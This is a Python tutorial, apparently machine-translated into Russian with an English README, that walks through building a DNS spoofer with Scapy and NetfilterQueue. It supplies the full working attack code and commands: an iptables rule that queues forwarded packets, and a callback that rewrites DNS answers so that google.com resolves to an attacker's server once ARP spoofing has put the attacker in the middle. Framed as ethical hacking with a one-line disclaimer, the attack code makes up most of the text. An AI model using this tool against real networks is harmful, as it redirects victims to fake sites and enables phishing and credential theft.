# [Writing a DNS Spoofer](https://www.thepythoncode.com/article/make-dns-spoof-python)
To successfully run it, you need:
- Linux machine ( or VM )
- `pip3 install -r requirements.txt`
- Run [ARP Spoof](../arp-spoofer/arp_spoof.py) script against the target.
- Run this script:
    ```
    python3 dns_spoof.py
    ```
##
# [[] / []]()
В предыдущем уроке мы обсуждали подделку ARP и то, как успешно сделать этот вид атаки с помощью библиотеки Scapy. Тем не менее, мы не упомянули о преимуществе быть человеком посередине. В этом уроке мы увидим один из интересных методов, DNS-спуфинг.

Что такое DNS
Сервер Domain Name System преобразует читаемое человеком доменное имя (например, google.com) в IP-адрес, который используется для установления соединения между сервером и клиентом, например, если пользователь хочет подключиться к google.com, машина пользователя автоматически отправит запрос на DNS-сервер, сказав, что я хочу, чтобы IP-адрес google.com как показано на рисунке:

DNS-запросСервер ответит соответствующим IP-адресом этого доменного имени:

Ответ DNS

Затем пользователь будет нормально подключаться к серверу:

Подключение к серверу после DNS-запроса

Хорошо, это совершенно нормально, но что, если между пользователем и Интернетом есть машина «человек посередине»? ну, этот человек посередине может быть DNS Spoofer!

Получите: Создайте 24 этических хакерских скрипта и инструмента с помощью Python Book

Что такое DNS-спуфинг
DNS-спуфинг, также называемый отравлением кэша DNS, представляет собой форму взлома компьютерной безопасности, при которой поврежденные данные системы доменных имен вводятся в кэш распознавателя DNS, в результате чего сервер имен возвращает неправильную запись результата, например, IP-адрес. Это приводит к тому, что трафик перенаправляется на компьютер злоумышленника (или любой другой компьютер). (Википедия)

Но метод, который мы собираемся использовать, немного отличается, давайте посмотрим на него в действии:

Запрос на подделку DNS

Примечание: Для того, чтобы быть человеком посередине, вам нужно выполнить сценарий подделки ARP, чтобы жертва сначала отправляла DNS-запросы на вашу машину, а не напрямую направляла их в Интернет.

Теперь, поскольку злоумышленник находится между ними, он получит DNS-запрос, указывающий «каков IP-адрес google.com», а затем он перенаправит его на DNS-сервер, как показано на следующем рисунке:

Злоумышленник пересылает DNS-запросDNS-сервер получил законный запрос, он ответит DNS-ответом:

Ответ DNS

Теперь злоумышленник получил тот DNS-ответ, который имеет реальный IP-адрес google.com, теперь он изменит этот IP-адрес на вредоносный поддельный IP-адрес (в данном случае его собственный веб-сервер 192.168.1.100 или 192.168.1.106 или что-то еще):

ПОДДЕЛЬНЫЙ IP-адрес ответа DNS

Таким образом, когда пользователь вводит google.com в браузере, он увидит поддельную страницу злоумышленника, не заметив этого!

Давайте посмотрим, как мы можем реализовать эту атаку с помощью Scapy в Python.

Связанные с: Этический взлом с Python Book

Написание сценария
Во-первых, я должен упомянуть, что мы будем использовать библиотеку NetfilterQueue, которая предоставляет доступ к пакетам, соответствующим правилу iptables в Linux (поэтому это будет работать только на дистрибутивах Linux).

Как вы можете догадаться, нам нужно вставить правило iptables, открыть терминал linux и ввести:

iptables -I FORWARD -j NFQUEUE --queue-num 0
Это правило указывает, что всякий раз, когда пакет пересылается, перенаправляйте его ( -j для перехода ) на номер очереди netfilter 0. Это позволит нам перенаправить все пересылаемые пакеты на Python.

Теперь давайте установим необходимые зависимости:

pip3 install netfilterqueue scapy
Let's import our modules (You need to install Scapy first, head to this tutorial or the official scapy documentation for installation):

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
Давайте определимся с нашим словарем DNS:

# DNS mapping records, feel free to add/modify this dictionary
# for example, google.com will be redirected to 192.168.1.100
dns_hosts = {
    b"www.google.com.": "192.168.1.100",
    b"google.com.": "192.168.1.100",
    b"facebook.com.": "172.217.19.142"
}
Объекту очереди netfilter потребуется обратный вызов, который вызывается всякий раз, когда пересылается пакет, давайте реализуем его:

def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()
Все, что мы здесь сделали, это преобразовали пакет очереди netfilter в пакет scapy, а затем проверили, является ли это ответом DNS, если это так, нам нужно изменить его с помощью функции modify_packet (packet), давайте определим его:

def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet
Теперь давайте создадим экземпляр объекта очереди netfilter после вставки правила iptables:

QUEUE_NUM = 0
# insert the iptables FORWARD rule
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# instantiate the netfilter queue
queue = NetfilterQueue()
Нам нужно связать номер очереди netfilter с обратным вызовом, который мы только что написали, и запустить его:

try:
    # bind the queue number to our callback `process_packet`
    # and start it
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    # if want to exit, make sure we
    # remove that rule we just inserted, going back to normal.
    os.system("iptables --flush")
Связанные с: Создание 24 хакерских инструментов с нуля с использованием Python

Я обернул его в try-except, чтобы обнаружить всякий раз, когда нажимается CTRL + C, чтобы мы могли удалить правило iptables, которое мы только что вставили.

Вот и все, теперь, прежде чем мы выполним его, помните, что нам нужно быть человеком посередине, поэтому давайте выполним наш скрипт arp spoof, который мы сделали в предыдущем уроке:

Подделка ARPДавайте выполним dns spoofer, который мы только что создали:

root@rockikz:~# python3 dns_spoof.py
Теперь скрипт прослушивает ответы DNS, давайте перейдем к машине жертвы и пингуем google.com:

Пинг google.com при подделке DNS

Подождите, что? IP-адрес google.com 192.168.1.100 !

Давайте попробуем просмотреть Google:

Результат подделки DNS

Я настроил простой веб-сервер на 192.168.1.100 (локальный сервер), который возвращает эту страницу, теперь google.com сопоставлен с 192.168.1.100 ! Удивительно.

Возвращаясь к машине злоумышленника:

Вывод подделки DNS

Поздравляю! Вы успешно завершили написание сценария атаки DNS-подделки, что не очень тривиально. Если вы хотите завершить атаку, просто нажмите CTRL + C на arp spoofer и DNS spoofer, и все готово.

ОТКАЗ от ответственности: Я не несу ответственности за использование этого скрипта в сети, на которую у вас нет разрешения. Используйте его под свою ответственность.

Подводя итог, этот метод широко используется среди тестеров сетевого проникновения, и теперь вы должны знать об этих видах атак.

В книге Ethical Hacking with Python мы создаем более 20 хакерских скриптов и инструментов! Проверьте это здесь, если вам интересно.